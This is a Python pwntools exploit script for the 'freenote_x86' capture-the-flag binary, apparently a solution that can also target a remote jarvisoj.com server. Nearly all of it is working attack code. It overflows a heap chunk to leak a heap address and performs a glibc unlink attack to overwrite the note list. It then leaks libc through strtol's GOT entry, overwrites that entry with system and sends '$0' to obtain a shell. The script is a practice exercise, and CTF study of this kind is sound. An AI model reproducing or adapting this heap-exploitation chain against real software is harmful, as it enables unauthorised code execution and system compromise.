from pwn import *
#context.log_level = 'debug'
#context.terminal = ['terminator','-x','bash','-c']

local = 1

if local:
    cn = process("./freenote_x86")
    bin = ELF("freenote_x86")
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    cn = remote('pwn2.jarvisoj.com',9885)
    bin = ELF("freenote_x86")
    libc = ELF("libc-2.19.so")

def list_post():
    pass

def add_post(length,content):
    cn.sendline('2')
    cn.recvuntil('Length')
    cn.sendline(str(length))
    cn.recvuntil('Enter')
    cn.sendline(content)

def edit_post(idx,length,content):
    cn.sendline('3')
    cn.recvuntil('number')
    cn.sendline(str(idx))
    cn.recvuntil('Length')
    cn.sendline(str(length))
    cn.recvuntil('Enter')
    cn.sendline(content)

def del_post(idx):
    cn.sendline('4')
    cn.recvuntil('number')
    cn.sendline(str(idx))

#chunk_list=0x0804A2EC
#test=0x08048CC5

#-------init-------
for i in range(5):
    add_post(0x80,str(i)*0x80)

del_post(3)
del_post(1)

#gdb.attach(cn)
pay = '0'*0x80 + 'a'*0x8
edit_post(0,0x88,pay)
#------------------
#gdb.attach(cn)

#--------leak----------
cn.sendline('1')
cn.recvuntil('a'*0x8)
leak_addr = u32(cn.recv(4))
cn.recv()
heap_base = leak_addr - 0xdb0#offset
chunk0_addr = heap_base + 0x18
success("leak_addr: "+hex(leak_addr))
success("heap_base: "+hex(heap_base))
success("chunk0_addr: "+hex(chunk0_addr))
#----------------------

#-------unlink--------
pay = p32(0x88) + p32(0x80) + p32(chunk0_addr-0xc) + p32(chunk0_addr-0x8) + '0'*(0x80-4*4)
pay += p32(0x80) + p32(0x88+0x88)
edit_post(0,len(pay),pay)
#gdb.attach(cn)
del_post(1)
#----------------------
#gdb.attach(cn)
#--------leak----------
pay = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr-0xc)
pay += p32(1)+p32(0x4)+p32(bin.got['strtol'])
pay += '\x00'*(0x88-len(pay))
edit_post(0,len(pay),pay)
cn.sendline('1')
cn.recvuntil('0. ')
cn.recvuntil('1. ')
strtol = cn.recvuntil('\x0a')[:-1]
cn.recv()
strtol = u32(strtol)
system = strtol - libc.symbols['strtol']+libc.symbols['system']
success("strtol: "+hex(strtol))
success("system: "+hex(system))
#----------------------
gdb.attach(cn)
#--------hijack&getshell--------
edit_post(1,4,p32(system))
cn.sendline("$0")
#----------------------

cn.interactive()
